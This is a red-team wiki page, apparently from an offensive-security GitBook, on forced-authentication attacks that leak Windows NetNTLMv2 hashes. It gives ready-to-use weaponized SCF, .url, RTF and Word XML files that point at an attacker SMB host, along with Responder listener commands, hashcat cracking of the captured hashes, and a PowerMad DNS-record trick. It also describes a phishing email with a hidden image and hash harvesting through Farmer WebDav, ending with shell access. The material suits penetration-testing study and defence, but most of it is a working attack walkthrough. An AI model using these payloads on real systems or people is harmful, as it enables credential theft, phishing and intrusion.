# Forced Authentication

## Forced Authentication

### Execution via Hyperlink

Let's create a Word document that has a hyperlink to our attacking server where `responder` will be listening on port 445:

![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LKCAKJidobdxoxL_0-7%2F-LKC4fAdfKEX0Kd4zlgf%2Fforced-auth-word.png?alt=media\&token=56a8a1a8-8905-49ee-8414-e4baa5835b38)

Let's start `Responder` on our kali box:

{% code title="attacker\@local" %}
```csharp
responder -I eth1
```
{% endcode %}

Once the link in the document is clicked, the target system sends an authentication request to the attacking host. Since responder is listening on the other end, victim's `NetNTLMv2` hash is captured:

![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LKCAKJidobdxoxL_0-7%2F-LKC95OKwWvm9FWiXc6e%2Fforced-auth-hashes.png?alt=media\&token=771cfa33-9f02-439f-940f-3d0948c9f091)

The retrieved hash can then be cracked offline with hashcat:

```csharp
hashcat -m5600 /usr/share/responder/logs/SMBv2-NTLMv2-SSP-10.0.0.2.txt /usr/share/wordlists/rockyou.txt --force
```

Success, the password is cracked:

![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LKCAKJidobdxoxL_0-7%2F-LKCA3c5a-MzMOTuxx3q%2Fforced-auth-cracked.png?alt=media\&token=dd0c439f-c26f-4778-94f6-23f5831ea7ec)

Using the cracked passsword to get a shell on the victim system:

![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LKCAKJidobdxoxL_0-7%2F-LKCAGEuBq07bj27tGIx%2Fforced-auth-shell.png?alt=media\&token=b0137356-fd9d-4e0f-a046-2671df309fb9)

### Execution via .SCF

Place the below `fa.scf` file on the attacker controlled machine at `10.0.0.7` in a shared folder `tools`

{% file src="../../.gitbook/assets/@fa.scf" %}

{% code title="\10.0.0.7\tools\fa.scf" %}
```csharp
[Shell]
Command=2
IconFile=\\10.0.0.5\tools\nc.ico
[Taskbar]
Command=ToggleDesktop
```
{% endcode %}

A victim user `low` opens the share `\\10.0.0.7\tools` and the `fa.scf` gets executed automatically, which in turn forces the victim system to attempt to authenticate to the attacking system at 10.0.0.5 where responder is listening:

![victim opens \\\10.0.0.7\tools, fa.scf executes and gives away low's hashes](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LKCWbiypNbsZ3LLIbj3%2F-LKCXuht57709Z3aInGZ%2Fforced-auth-shares.png?alt=media\&token=c95661a8-528c-4927-8163-bce7a6d09ae1)

![user's low hashes were received by the attacker](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LKCWbiypNbsZ3LLIbj3%2F-LKCXuhrcaEw8YDKnwq7%2Fforced-auth-scf.png?alt=media\&token=9256541a-e06e-4e00-8ba6-5e9a5ed9b82a)

What's interesting with the `.scf` attack is that the file could easily be downloaded through the browser and as soon as the user navigates to the `Downloads` folder, users's hash is stolen:

![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LKCaFWG1wRaLICda4BJ%2F-LKCa57wIu4idO3s7xlW%2Fforced-auth-downloads.png?alt=media\&token=a9bded2b-6c60-424a-88c7-8b3a148c988b)

### Execution via .URL

Create a weaponized .url file and upload it to the victim system:

{% code title="c:\link.url\@victim" %}
```csharp
[InternetShortcut]
URL=whatever
WorkingDirectory=whatever
IconFile=\\10.0.0.5\%USERNAME%.icon
IconIndex=1
```
{% endcode %}

Create a listener on the attacking system:

{% code title="attacker\@local" %}
```
responder -I eth1 -v
```
{% endcode %}

Once the victim navigates to the C:\ where `link.url` file is placed, the OS tries to authenticate to the attacker's malicious SMB listener on `10.0.0.5` where NetNTLMv2 hash is captured:

![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LNBag_nxT92_UEIeHF6%2F-LNBbbi9QbPgnEV975AY%2Fforced-authentication-url.gif?alt=media\&token=86743379-a2f6-4353-ae1b-f008bd065163)

### Execution via .RTF

Weaponizing .rtf file, which will attempt to load an image from the attacking system:

{% code title="file.rtf" %}
```csharp
{\rtf1{\field{\*\fldinst {INCLUDEPICTURE "file://10.0.0.5/test.jpg" \\* MERGEFORMAT\\d}}{\fldrslt}}}
```
{% endcode %}

Starting authentication listener on the attacking system:

{% code title="attacker\@local" %}
```
responder -I eth1 -v
```
{% endcode %}

Executing the file.rtf on the victim system gives away user's hashes:

![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LPm-TrX68odFOLvBw6q%2F-LPlz_8cJxxMBbpLeGSk%2Frtf-hashes.gif?alt=media\&token=698628cf-448c-465b-ac42-2adf6f0fbec9)

### Execution via .XML

MS Word Documents can be saved as .xml:

![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LTIlHXY1_59Aa8z2oVJ%2F-LTIqx0t4SlhDJDdnp9H%2FScreenshot%20from%202018-12-09%2016-23-39.png?alt=media\&token=ef2c5a56-6176-4113-a89c-8c462b9c5e56)

This can be exploited by including a tag that requests the document stylesheet (line 3) from an attacker controlled server. The victim system will share its NetNTLM hashes with the attacker when attempting to authenticate to the attacker's system:

```markup
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<?mso-application progid="Word.Document"?>
<?xml-stylesheet type="text/xsl" href="\\10.0.0.5\bad.xsl" ?>
```

Below is the attack illustrated:

![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LTIlHXY1_59Aa8z2oVJ%2F-LTIqn7U-sNTvcz6Uq_1%2FPeek%202018-12-09%2016-44.gif?alt=media\&token=25652c78-0937-4613-92c2-2e57f544a422)

{% file src="../../.gitbook/assets/test-xls-stylesheet.xml" %}

### Execution via Field IncludePicture

Create a new Word document and insert a new field `IncludePicture`:

![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LTItDXo_VwQdF8UZfy4%2F-LTIue9CV23QbGlp_Xtc%2FScreenshot%20from%202018-12-09%2017-01-11.png?alt=media\&token=4bd9c4a6-4f79-4fa8-8ae3-bb66ca533e0d)

Save the file as .xml. Note that the sneaky image url is present in the XML:

![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LTItDXo_VwQdF8UZfy4%2F-LTIuxNGAIJRG9Ceq57O%2FScreenshot%20from%202018-12-09%2017-02-32.png?alt=media\&token=a0096fbf-10ba-4b80-9015-699e019bb3ac)

Launching the document gives away victim's hashes immediately:

![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LTItDXo_VwQdF8UZfy4%2F-LTIvUDMNsKiX_VpjLGA%2FPeek%202018-12-09%2017-04.gif?alt=media\&token=4f5d23ab-0b1a-4396-ac2d-a98bc925296a)

{% file src="../../.gitbook/assets/smb-image.xml" %}

### Execution via HTTP Image and Internal DNS

If we have a foothold in a network, we can do the following:

* Create a new DNS A record (any authenticated user can do it) inside the domain, say `offense.local`, you have a foothold in, and point it to your external server, say `1.1.1.1`
  * Use [PowerMad](https://github.com/Kevin-Robertson/Powermad) to do this with: `Invoke-DNSUpdate -dnsname vpn -dnsdata 1.1.1.1`
* On your controlled server 1.1.1.1, start `Responder` and listen for HTTP connections on port 80
* Create a phishing email, that contains `<img src="http://vpn.offense.local"/>`
  * Feel free to make the image 1x1 px or hidden
  * Note that `http://vpn.offense.local` resolves to `1.1.1.1` (where your Responder is listening on port 80), but only from inside the `offense.local` domain
* Send the phish to target users from the `offense.local` domain
* Phish recipients view the email, which automatically attemps to load the image from `http://vpn.offense.local`, which resolves to `http://1.1.1.1` (where Responder is litening on port 80)
* Responder catches NetNLTMv2 hashes for the targeted users with no user interaction required
* Start cracking the hashes
* Hopefully profit

### Farmer WebDav

When inside a network, we can attempt to force hash leaks from other users by forcing them to authenticate to our WebDav server that we can bind to any an unused port without administrator privileges. To achieve this, we can use a tool called [Farmer](https://github.com/mdsecactivebreach/Farmer) by [@domchell](https://twitter.com/domchell?s=20).

Below will make the farmer listen on port 7443:

```
Farmer.exe 7443
```

Below shows how the Farmer successfully collects a hash for the user `spotless` when they are forced to authenticate to the malicious webdav when `ls \\spotless@7443\spotless.png` is executed:

![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-MVflpDX5A6_JFJp2Kld%2F-MVgElwKypgONia1Tzl_%2Fimage.png?alt=media\&token=f4ba07db-a3e7-41d9-96b4-a7326dedee1e)

Below shows how the Farmer successfully collects a hash from user `spotless` via a shortcut icon that points to our malicious webdav at `\\spotless@3443\spotless.png`:

![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-MVflpDX5A6_JFJp2Kld%2F-MVgIZw9CYFtkwLA16JH%2Fharvest-hash-shortcut.gif?alt=media\&token=2c671eb4-0335-4600-a548-8d6274e83f0f)

### References

{% embed url="https://www.securify.nl/blog/SFY20180501/living-off-the-land_-stealing-netntlm-hashes.html" %}

{% embed url="https://www.mdsec.co.uk/2021/02/farming-for-red-teams-harvesting-netntlm/" %}

{% embed url="https://bohops.com/2018/08/04/capturing-netntlm-hashes-with-office-dot-xml-documents/" %}

{% embed url="https://pentestlab.blog/2017/12/13/smb-share-scf-file-attacks/" %}

